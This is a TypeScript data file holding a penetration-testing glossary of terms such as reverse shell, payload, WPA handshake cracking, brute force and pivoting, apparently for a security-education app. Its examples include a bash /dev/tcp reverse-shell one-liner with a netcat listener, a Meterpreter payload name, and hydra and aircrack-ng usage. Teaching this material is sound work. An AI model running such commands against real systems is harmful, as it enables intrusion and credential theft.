import { GlossaryTerm } from '../types';

export const GLOSSARY: GlossaryTerm[] = [
  {
    term: 'IP Address',
    category: 'Networking',
    definition: 'Internet Protocol address is a unique numerical label assigned to every device connected to a computer network (e.g. 192.168.1.10 for IPv4 or 2001:db8::1 for IPv6).',
    practicalExample: 'When you scan a computer using `nmap 192.168.1.50`, that number is the target IP address.',
  },
  {
    term: 'Port',
    category: 'Networking',
    definition: 'A 16-bit virtual communication channel (from 0 to 65535) that directs incoming network traffic to a specific software service running on an operating system.',
    practicalExample: 'Port 80 is HTTP web, Port 443 is HTTPS encrypted web, Port 22 is SSH remote terminal access.',
  },
  {
    term: 'Payload',
    category: 'Exploitation',
    definition: 'The actual piece of malicious or investigative code that executes on a target system once a vulnerability has been breached (e.g. a reverse shell, command executor, or credential extractor).',
    practicalExample: 'When running Metasploit, the exploit breaks the lock, and the payload (like `linux/x64/meterpreter/reverse_tcp`) is what runs inside.',
  },
  {
    term: 'Exploit',
    category: 'Exploitation',
    definition: 'A piece of software, data chunk, or sequence of commands that takes advantage of a bug, glitch, or vulnerability to cause unintended behavior on computer software or hardware.',
    practicalExample: 'An exploit script sends an oversized memory buffer to an unpatched FTP daemon to hijack its instruction pointer.',
  },
  {
    term: 'Hash',
    category: 'Cryptography',
    definition: 'A one-way mathematical function that converts any arbitrary input text into a fixed-length string of characters. It is practically impossible to reverse mathematically without guessing.',
    practicalExample: 'The MD5 hash of "password123" is `482c811da5d5b4bc6d497ffa98491e38`. Hashcat tries millions of words per second to find a match.',
  },
  {
    term: 'CVE (Common Vulnerabilities and Exposures)',
    category: 'Security Standards',
    definition: 'A standardized, publicly disclosed reference ID for a specific computer security flaw, formatted as CVE-YEAR-NUMBER (e.g., CVE-2021-44228 for Log4Shell).',
    practicalExample: 'When searching Exploit-DB via `searchsploit`, referencing the CVE number guarantees you find the exact security advisory.',
  },
  {
    term: 'SUID (Set User ID)',
    category: 'Linux Permissions',
    definition: 'A special Linux permission bit that causes an executable file to run with the permissions of the file owner (usually root) instead of the user who launched it.',
    practicalExample: '`/usr/bin/passwd` has SUID root so normal users can update their passwords inside the protected `/etc/shadow` file.',
  },
  {
    term: 'Reverse Shell',
    category: 'Exploitation',
    definition: 'A connection initiated FROM the target machine OUTBOUND back to the tester\'s listening computer, providing interactive terminal access while bypassing inbound firewalls.',
    practicalExample: 'You run `nc -lvnp 4444` on Kali, and the target executes `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` to hand you a terminal.',
  },
  {
    term: 'Handshake (4-Way WPA)',
    category: 'Wireless Security',
    definition: 'The cryptographic negotiation between a Wi-Fi client and an access point to prove they both know the pre-shared Wi-Fi password without ever transmitting the password across the air.',
    practicalExample: '`airodump-ng` captures this 4-packet exchange, allowing `aircrack-ng` to test millions of passwords from `rockyou.txt` completely offline.',
  },
  {
    term: 'Wordlist (Dictionary)',
    category: 'Password Security',
    definition: 'A text file containing thousands or millions of common words, leaked passwords, usernames, or directory names used in automated brute-force attacks.',
    practicalExample: 'Kali includes the famous `/usr/share/wordlists/rockyou.txt` dictionary, containing 14,344,384 real leaked passwords.',
  },
  {
    term: 'Brute-Force Attack',
    category: 'Authentication',
    definition: 'An exhaustive trial-and-error method of attempting every possible combination of credentials or characters until the correct one is discovered.',
    practicalExample: 'Using `hydra` to test 50 common passwords against an SSH login server in a practice lab.',
  },
  {
    term: 'Reconnaissance (Recon / OSINT)',
    category: 'Information Gathering',
    definition: 'The preliminary phase of security testing where an analyst gathers intelligence about a target (domains, IP ranges, employee emails, technologies) before touching any systems.',
    practicalExample: 'Using `whois`, Google dorks, and `theHarvester` to gather passive intelligence on target systems.',
  },
  {
    term: 'Pivoting',
    category: 'Post-Exploitation',
    definition: 'The technique of using a compromised computer on a perimeter network as a stepping stone or proxy bridge to route attacks deeper into internal, unroutable private subnets.',
    practicalExample: 'Using an SSH dynamic SOCKS proxy (`ssh -D 9050`) or Meterpreter route command to scan an internal `10.0.2.0/24` lab subnet.',
  },
  {
    term: 'Buffer Overflow',
    category: 'Vulnerabilities',
    definition: 'An anomaly where a program, while writing data to a memory buffer, overruns the buffer\'s boundary and overwrites adjacent memory locations, potentially hijacking CPU instruction flow.',
    practicalExample: 'Sending 2,000 "A" characters into an input field to overwrite the EIP/RIP register and jump into attacker shellcode.',
  },
  {
    term: 'Man-In-The-Middle (MITM)',
    category: 'Network Attacks',
    definition: 'An attack where the adversary secretly relays and possibly alters the communications between two parties who believe they are directly communicating with each other.',
    practicalExample: 'Using ARP poisoning to trick a target computer into thinking your Kali machine is the default internet gateway.',
  },
];
